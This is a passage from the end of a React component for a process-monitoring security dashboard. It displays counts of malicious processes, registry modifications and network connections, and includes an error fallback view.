                      return acc;
                    }, {})
                  ).sort(([,a], [,b]) => b - a)[0]?.[0] || 'None'}
                </dd>
              </div>
              <div>
                <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">Malicious Processes</dt>
                <dd className="mt-1 text-sm text-gray-900 dark:text-white">
                  {enhancedEvents.filter(e => e.enrichment?.threat_intel?.verdict === 'malicious').length} detected
                </dd>
              </div>
              <div>
                <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">Registry Modifications</dt>
                <dd className="mt-1 text-sm text-gray-900 dark:text-white">
                  {enhancedEvents.filter(e => e.event_type === 'registry').length} events
                </dd>
              </div>
              <div>
                <dt className="text-sm font-medium text-gray-500 dark:text-gray-400">Network Connections</dt>
                <dd className="mt-1 text-sm text-gray-900 dark:text-white">
                  {enhancedEvents.filter(e => e.event_type === 'network').length} established
                </dd>
              </div>
            </div>
          </div>
        </div>

        {/* Detailed Analysis Modal */}
        <DetailedAnalysisModal
          isOpen={showDetailModal}
          onClose={() => setShowDetailModal(false)}
          item={selectedEvent}
          itemType={selectedEvent?.event_type || 'process'}
          relatedData={enhancedEvents}
        />
      </div>
    );
  } catch (error) {
    console.error('Error in ProcessMonitor component:', error);
    return (
      <div className="p-6">
        <div className="text-center py-12">
          <ExclamationTriangleIcon className="mx-auto h-12 w-12 text-red-400 dark:text-red-500" />
          <h3 className="mt-2 text-sm font-medium text-gray-900 dark:text-white">Error Loading Process Monitor</h3>
          <p className="mt-1 text-sm text-gray-500 dark:text-gray-400">
            There was an error loading the process monitoring data. Please try refreshing the page.
          </p>
        </div>
      </div>
    );
  }
};

export default ProcessMonitor;
